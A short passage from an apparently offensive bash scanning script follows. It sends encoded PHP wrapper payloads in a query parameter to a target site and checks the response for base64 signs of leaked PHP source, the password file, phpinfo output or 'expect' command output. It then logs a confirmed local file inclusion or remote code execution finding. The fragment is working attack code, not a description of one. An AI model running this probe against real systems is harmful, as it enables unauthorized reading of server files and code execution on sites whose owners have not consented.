            local resp=$(_curl "https://$TARGET/?$param=$enc_wrapper" 2>/dev/null)
            echo "$resp" | grep -qE "PD9waH|cm9vdD|phpinfo|ZXhwZWN0" && \
                { echo "PHP WRAPPER: ?$param=$wrapper" >> "$SESSION/rt/php_wrapper_lfi.txt"; rt "PHP wrapper LFI/RCE confirmed!"; }
